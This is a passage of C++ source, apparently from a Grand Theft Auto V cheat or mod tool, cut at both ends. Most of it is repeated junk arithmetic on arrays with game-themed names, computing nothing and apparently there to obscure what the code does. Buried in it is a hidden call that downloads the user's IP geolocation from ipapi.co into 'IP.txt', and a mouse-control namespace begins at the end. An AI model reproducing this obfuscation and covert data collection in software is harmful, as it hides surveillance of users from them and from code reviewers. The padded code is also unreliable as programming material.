				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Extern_Reader::WEB::DownloadFile("https://ipapi.co/json", "IP.txt");
			}
		}
	}
	namespace MouseAndScreen
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		void MoveMouseTo(int x, int y)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
